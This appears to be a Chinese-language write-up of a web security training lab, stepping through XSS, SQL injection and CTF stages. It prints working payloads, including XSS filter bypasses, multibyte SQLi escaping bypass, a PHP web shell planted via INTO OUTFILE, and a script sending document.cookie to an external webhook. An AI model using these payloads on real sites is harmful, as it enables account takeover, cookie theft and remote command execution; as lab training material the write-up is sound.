# Web Training 

- [XSS](#xss)
- [SQL Injection](#sqli)
- [CTF](#ctf)

<h2 id=xss>XSS</h2>

### Stage 1 : 基本的 SQL 題目
![](/Web_Threat_Training/XSS/Web_Threat_Training_XSS_1)

- 輸入 Payload : ```<script>alert(1)</script>```
![](/Web_Threat_Training/XSS/Web_Threat_Training_XSS_2)

- 跳出告警視窗，順利進入下一關
![](/Web_Threat_Training/XSS/Web_Threat_Training_XSS_3)

### Stage 2 
![](/Web_Threat_Training/XSS/Web_Threat_Training_XSS_4)

- 先隨便輸入個東西，送出
![](/Web_Threat_Training/XSS/Web_Threat_Training_XSS_5)

- 看一下source code，```<input type='hidden' value='leowu'>``` 
- 輸入的值會放在input value 裡，input value 被 hidden 起來
![](/Web_Threat_Training/XSS/Web_Threat_Training_XSS_6)

- 試試看關閉整個 input tag , 再放入 script
- payload : ```"><script>alert(1)</script>```
![](/Web_Threat_Training/XSS/Web_Threat_Training_XSS_7)

- alert pop
![](/Web_Threat_Training/XSS/Web_Threat_Training_XSS_8)

<h3>Stage 3 </h3>

![](/Web_Threat_Training/XSS/Web_Threat_Training_XSS_9)

- 同樣隨意輸入個值
![](/Web_Threat_Training/XSS/Web_Threat_Training_XSS_10)

- 檢查Source Code，和上一題一樣寫入了input box 
![](/Web_Threat_Training/XSS/Web_Threat_Training_XSS_11)

- 試著送同樣的payload: ```"><script>alert(1)</script>```
![](/Web_Threat_Training/XSS/Web_Threat_Training_XSS_12)

- 發現印出來的值，被過濾過了，要想辦法繞過過濾
- 可以看出被過濾的事script 這個字
![](/Web_Threat_Training/XSS/Web_Threat_Training_XSS_13)

- 試著把script 做些變動像是
- ```<SCript></scRIPT>``` or ```<sscriptcript></sscriptcript>```
- payload : ```"><SCripT>alert(1)</scRIPt>```
![](/Web_Threat_Training/XSS/Web_Threat_Training_XSS_14)
- payload : ```"><sscriptcript>alert(123)</scrscriptript>``` 
![](/Web_Threat_Training/XSS/Web_Threat_Training_XSS_16)

- 送出後成功了！！！
![](/Web_Threat_Training/XSS/Web_Threat_Training_XSS_17)

### Stage 4 
![](/Web_Threat_Training/XSS/Web_Threat_Training_XSS_18)

- 同樣隨意輸入個值
![](/Web_Threat_Training/XSS/Web_Threat_Training_XSS_19)

- 這次被寫入```<script>document.write("leowu")</script>```
![](/Web_Threat_Training/XSS/Web_Threat_Training_XSS_20)

- 一樣試著構造新的script 作為payload 
- payload : ```x");alert("1```
![](/Web_Threat_Training/XSS/Web_Threat_Training_XSS_21)

- Success !!!
![](/Web_Threat_Training/XSS/Web_Threat_Training_XSS_22)

### Stage 5 
![](/Web_Threat_Training/XSS/Web_Threat_Training_XSS_23)

- 同樣隨意輸入個值
![](/Web_Threat_Training/XSS/Web_Threat_Training_XSS_24)

- 這次會發現原本的圖片無法讀取了，這是個搜尋圖片來源的輸入匡
- 果然看到 source code ```<img src="leo">```

![](/Web_Threat_Training/XSS/Web_Threat_Training_XSS_25)

- 已知這裡有用 img tag, 試試看家一些attribute 上去
- [Event Attribute](https://www.w3schools.com/tags/ref_eventattributes.asp)



- payload : 
    1. ```www.google.com" onerror="alert(1)```
    - 這個payload 前面放什麼不重要，主要是能造成圖片讀取error 觸發error attribute
    ![](/Web_Threat_Training/XSS/Web_Threat_Training_XSS_26)


    2. ```lolcat_airplan.jpg onload="alert(1)```
    - 這個 payload 要首先知道可以跑出來的圖片名稱，在觸發onload attribute
    ![](/Web_Threat_Training/XSS/Web_Threat_Training_XSS_27)
    ![](/Web_Threat_Training/XSS/Web_Threat_Training_XSS_28)

- 成功後跳到最後的結束頁面！！！
![](/Web_Threat_Training/XSS/Web_Threat_Training_XSS_29)

- 這題有個特別的地方，透過 onclick 觸發其實也是成功造成xss 
![](/Web_Threat_Training/XSS/Web_Threat_Training_XSS_30)


- 但因為這題的設計上需要做到頁面跳轉，所以click 完後並不會call window.location.href 所以不會造增跳轉
![](/Web_Threat_Training/XSS/Web_Threat_Training_XSS_31)
![](/Web_Threat_Training/XSS/Web_Threat_Training_XSS_32)
![](/Web_Threat_Training/XSS/Web_Threat_Training_XSS_33)

### Reference 

- [Event Attribute](https://www.w3schools.com/tags/ref_eventattributes.asp)

<h2 id=sqli>SQL Injection </h2>

### Stage 1
![](/Web_Threat_Training/SQL/Web_Threat_Training_SQL_1)

- 間單的 payload : ``` ' OR 1='1 ```
![](/Web_Threat_Training/SQL/Web_Threat_Training_SQL_2)
![](/Web_Threat_Training/SQL/Web_Threat_Training_SQL_3)


- Next Stage 
![](/Web_Threat_Training/SQL/Web_Threat_Training_SQL_4)

### Stage 2  : MultiByte SQLi
![](/Web_Threat_Training/SQL/Web_Threat_Training_SQL_5)

- 先試試基本的payload ```' OR 1='1```
- 被跳脫了在quote (``` ' ```) 之前加了backslash (```\```)
![](/Web_Threat_Training/SQL/Web_Threat_Training_SQL_6)


- 介紹個有關於multi-byte 的教學網站，裡面有個python script 可以產生特定hex code 對應不同encode 上的payload 
- [Using Multi-byte Characters To Nullify SQL Injection Sanitizing](http://howto.hackallthethings.com/2016/06/using-multi-byte-characters-to-nullify.html)
- [Github](https://github.com/hack-all-the-things/charsetinspect)

- ```python charset_inspect.py -n \\ -e ```
- 產生 backslash 在不同encode 方法尚未是哪些字
![](/Web_Threat_Training/SQL/Web_Threat_Training_SQL_7)

- 這題對應的DB適用 SJIS encode  (Shift_jis)
![](/Web_Threat_Training/SQL/Web_Threat_Training_SQL_8)

- payload : ```%83' ORO 1=1/*```  or ```%88%27+OR+1=1/*``` 
![](/Web_Threat_Training/SQL/Web_Threat_Training_SQL_9)
![](/Web_Threat_Training/SQL/Web_Threat_Training_SQL_10)

- payload 執行後sql 語句會像下圖的反白
![](/Web_Threat_Training/SQL/Web_Threat_Training_SQL_12)

### Stage 3 
![](/Web_Threat_Training/SQL/Web_Threat_Training_SQL_13)

- 這題是 UNION SELECT，先了解一下這個page 的運作模式
- 選單選了一個值後會在下方用類似table 的方式顯示result 
![](/Web_Threat_Training/SQL/Web_Threat_Training_SQL_14)

- 從URL 可以看到GET parameter 的值就是剛剛選單選的選項
- 這裡應該可以試試看SQL Injection
- Try 一下 UNION SELECT，果然有回應，根據response 應該是UNION SELECT 後的欄位數與實際欄位數量對不上
![](/Web_Threat_Training/SQL/Web_Threat_Training_SQL_15)
![](/Web_Threat_Training/SQL/Web_Threat_Training_SQL_16)

- 嘗試兩個欄位 --> Failed 
![](/Web_Threat_Training/SQL/Web_Threat_Training_SQL_17)

- 嘗試三個欄位 --> Failed 
![](/Web_Threat_Training/SQL/Web_Threat_Training_SQL_18)

- 嘗試四個欄位 --> Failed 
![](/Web_Threat_Training/SQL/Web_Threat_Training_SQL_19)


- 一直try 後會發現有6個欄位
- payload : ```' UNION SELECT 1,2,3,4,5,6/*```
![](/Web_Threat_Training/SQL/Web_Threat_Training_SQL_20)
![](/Web_Threat_Training/SQL/Web_Threat_Training_SQL_21)

- 題目要讓 page sleep 5 second 
- payload : ```' UNION SELECT 1,2,3,4,5,Sleep(5)/*```
![](/Web_Threat_Training/SQL/Web_Threat_Training_SQL_22)

### Stage 4 : Upload web shell by INTO OUTFILE
![](/Web_Threat_Training/SQL/Web_Threat_Training_SQL_23)


- 先看一下題目，跟剛剛第三題很像，但這裡要求要上傳payload 
![](/Web_Threat_Training/SQL/Web_Threat_Training_SQL_24)

- 是一下UNION SELECT 的欄位數量 (4個)
- payload : ```' UNION SELECT 1,2,3,4 INTO OUTFILE '/var/www/html/eef4a6d53c97b055136de86e412b42ac/shell.php'--%20```
![](/Web_Threat_Training/SQL/Web_Threat_Training_SQL_25)

- [INTO OUTFILE 1](https://www.cnblogs.com/tijun/p/8671217.html)
- [INTO OUTFILE 2](https://kknews.cc/zh-tw/code/e8ngvpq.html)
- [SQLi in INTO OUTFILE 1](https://blog.csdn.net/Blue_Starry_sky/article/details/88119353)
- [SQLi in INTO OUTFILE 2](https://ithelp.ithome.com.tw/articles/10240102)


- payload : ```' UNION SELECT 1,"<?php echo '<pre>'; system($_GET['cmd']); echo '</pre>';?>",3,4 INTO OUTFILE '/var/www/html/eef4a6d53c97b055136de86e412b42ac/shell.php'--%20```
![](/Web_Threat_Training/SQL/Web_Threat_Training_SQL_26)

- 這裡的結果顯示 Book not found .... ，可以得知SQL query 成功被執行
![](/Web_Threat_Training/SQL/Web_Threat_Training_SQL_27)

- Go to the page which we just store the web shell 
![](/Web_Threat_Training/SQL/Web_Threat_Training_SQL_28)

- 試著執行command 
![](/Web_Threat_Training/SQL/Web_Threat_Training_SQL_29)

### Reference 

- [Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [INTO OUTFILE 1](https://www.cnblogs.com/tijun/p/8671217.html)
- [INTO OUTFILE 2](https://kknews.cc/zh-tw/code/e8ngvpq.html)
- [SQLi in INTO OUTFILE 1](https://blog.csdn.net/Blue_Starry_sky/article/details/88119353)
- [SQLi in INTO OUTFILE 2](https://ithelp.ithome.com.tw/articles/10240102)


<h2 id=ctf>CTF</h2>

- 接下來是今天training 的總結，一個藏有SQL injection 和 XSS 的網站
- 先是個 login page ，應該很明顯是要sql injection 嘗試登入
![](/Web_Threat_Training/CTF/Web_Threat_Training_CTF_1)

- 是一下在username 欄位放入payload 
- payload : ```' OR 1='1 --  ```
![](/Web_Threat_Training/CTF/Web_Threat_Training_CTF_2)

- 結果頁面沒有發生變化，試試看在password 隨便放一個錯誤的值
- 跳到一個顯示錯誤訊息的page
![](/Web_Threat_Training/CTF/Web_Threat_Training_CTF_3)
![](/Web_Threat_Training/CTF/Web_Threat_Training_CTF_4)

- 從上面的嘗試可以知道，SQL Injection 的問題點應該是在password input box 上，而且這裡的欄位都需要填入值，不然會有種沒有執行的感覺，就直接繼續顯示login page 


- 嘗試了上面的payload 確實登入了，登入後可以看到裡面有個flag 
- flag{sql_1nject1on}
![](/Web_Threat_Training/CTF/Web_Threat_Training_CTF_5)

- 底下還有個contact admin (看來就算輸入admin 登入也不是admin...)，要變成admin 應該有其他方式
![](/Web_Threat_Training/CTF/Web_Threat_Training_CTF_6)

- 看了cookie ，這裡顯示login 的資訊是alice 
![](/Web_Threat_Training/CTF/Web_Threat_Training_CTF_7)


- 這裡的contact admin 如果有XSS 應該可以嘗試把 admin 的 cookie 給偷回來
- 這裡講師給了一個 hint : [XMLHTTPRequest](https://www.w3schools.com/xml/xml_http.asp)
- 先從外部弄一個可以接收server response 的host 
- [Webhook](https://webhook.site/)
- payload 大致長這樣 ```<script>var http=new XMLHttpRequest(); http.open("POST", "URL"); http.send(document.cookie)</script>```

- 把URL 換一下到外部可接收response 的host

- payload : ```<script>var http=new XMLHttpRequest(); http.open("POST", "URL"); http.send(document.cookie)</script>```
![](/Web_Threat_Training/CTF/Web_Threat_Training_CTF_8)


- Result 
![](/Web_Threat_Training/CTF/Web_Threat_Training_CTF_9)

- 從前面的 error message 可以知道query 的欄位還有一個 admin 
```
"SELECT username, password, admin from users where username = 'admin 'and password = '' OR '1''"

```
![](/Web_Threat_Training/CTF/Web_Threat_Training_CTF_13)

- 試著把login 的payload 改成 ```' or admin='1```
- 嘗試後會失敗，突然想到前面的解題，有拿到admin cookie 
- 把剛剛看到的cookie 都設定回去再試一次
![](/Web_Threat_Training/CTF/Web_Threat_Training_CTF_12)

- 進到 admin page 了！！
![](/Web_Threat_Training/CTF/Web_Threat_Training_CTF_11)

- admin page 裡有剛剛送過去的XSS payload 
![](/Web_Threat_Training/CTF/Web_Threat_Training_CTF_14)
![](/Web_Threat_Training/CTF/Web_Threat_Training_CTF_15)


###### tags: `Training` `Web Threat` `Security`